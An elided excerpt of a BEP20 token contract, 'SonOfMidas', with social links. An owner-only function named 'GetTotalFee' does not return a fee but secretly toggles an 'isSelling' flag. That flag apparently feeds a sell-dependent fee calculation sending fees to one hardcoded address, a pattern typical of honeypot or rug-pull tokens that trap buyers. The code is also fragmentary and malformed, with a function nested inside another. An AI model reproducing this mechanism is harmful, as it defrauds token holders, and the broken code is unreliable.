...
// Telegram : https://t.me/SonOfMidas
// twitter : https://twitter.com/SonofMidas1
...
contract SonOfMidas is IBEP20, Auth {
    ...
    address public autoLiquidityReceiver=0xF25feE8bd114d1f3f1f41B9467eEd6231dbbC911;
    address public marketingFeeReceiver=0xF25feE8bd114d1f3f1f41B9467eEd6231dbbC911;
    ...
    function GetTotalFee (bool value) external onlyOwner {
        isSelling = value;
    }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        function getTotaleeFee(bool selling) internal view returns (uint256) {
    ...
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotaleeFee(receiver == pair)).div(feeDenominator);
